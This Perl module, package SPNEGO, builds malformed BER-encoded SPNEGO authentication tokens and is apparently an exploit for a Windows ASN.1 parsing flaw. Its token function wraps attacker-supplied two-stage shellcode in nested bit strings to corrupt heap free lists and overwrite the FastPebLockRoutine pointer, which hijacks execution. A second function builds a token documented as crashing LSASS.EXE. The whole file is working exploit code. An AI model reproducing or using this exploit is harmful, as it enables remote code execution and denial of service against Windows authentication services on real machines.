package SPNEGO;
use strict;

#
# Returns the length of a string as ASN.1 BER encoded length octets,
# followed by the string.
#

sub asn1
{
	my $str = shift;
	my $len = length($str);

	if ($len < 0x7f) {
		return chr($len) . $str;
	}
	elsif ($len <= 0xffff) {
		return chr(0x82) . chr($len >> 8) . chr($len & 0xff) . $str;
	}
	else {
		die("len > 0xffff\n");
	}
}

#
# Returns a BER encoded bit string
#

sub bits
{
	my $str = shift;
	
	return "\x03" . asn1("\x00" . $str);	# Bit String, 0 unused bits
}

#
# Returns a BER encoded constructed bit string
#

sub constr
{
	my $str;
	for (@_) { $str .= $_ };
	
	return "\x23" . asn1($str);		# Constructed Bit String
}

#
# Returns a BER encoded SPNEGO token
#

sub token
{
	my $stage0 = shift;
	my $stage1 = shift;

	if (!$stage0 || !$stage1) {
		die "Invalid paramters in SPNEGO::token_short()\n";
	}

	if (length($stage0) > 1032) {
		die "stage0 shellcode longer than 1032 bytes\n";
	}

	# This is the tag placed before the stage1 shellcode.
	my $tag = "\x90\x42\x90\x42\x90\x42\x90\x42";

	if (length($tag) + length($stage1) > 1033) {
		die "stage1 shellcode longer than " . 1033-length($tag) . " bytes\n";
	}

	# The first two overwrites must succeed, so we write to an unused location
	# in the PEB block. We don't care about the values, because after this the
	# doubly linked list of free blocks is corrupted and we get to the second
	# overwrite which is more useful.

	my $fw = "\xf8\x0f\x01\x00";		# 0x00010ff8
	my $bk = "\xf8\x0f\x01";

	# The second overwrite writes the address of our shellcode into the
	# FastPebLockRoutine pointer in the PEB

	my $peblock = "\x20\xf0\xfd\x7f";			# FastPebLockRoutine in PEB

	my $bitstring =
		constr(
			bits("A"x1024),
			"\x03\x00",
			constr(
				bits($tag . $stage1 . 'B'x(1033-length($tag . $stage1))),
				constr(
					bits($fw . $bk)
				),
				constr(
					bits("CCCC".$peblock.$stage0 . "C"x(1032-length($stage0))),
					constr(
						bits("\xeb\x06\x90\x90\x90\x90\x90\x90"),
						bits("D"x1040)
					)
				)
			)
		);

	my $token =
		"\x60" . asn1(						# Application Constructed Object
			"\x06\x06\x2b\x06\x01\x05\x05\x02" .	# SPNEGO OID
			"\xa0" . asn1(					# NegTokenInit (0xa0)
				"\x30" . asn1(				# Constructed Sequence
					"\xA1" . asn1(			# ContextFlags (0xa1)
						$bitstring
					)
				)
			)
		);

	return $token;
}

#
# Returns a BER encoded SPNEGO token which crashes LSASS.EXE
#

sub token_eeye
{
	my $token =
		"\x60" . asn1(						# Application Constructed Object
			"\x06\x06\x2b\x06\x01\x05\x05\x02" . # SPNEGO OID
			"\xa0" . asn1(					# NegTokenInit (0xa0)
				"\x30" . asn1(				# Constructed Sequence
					"\xA1" . asn1(			# ContextFlags (0xa1)
						"\x23\x03\x03\x01\x07"
					)   
				)   
			)  
		);

	return $token;
}

1;
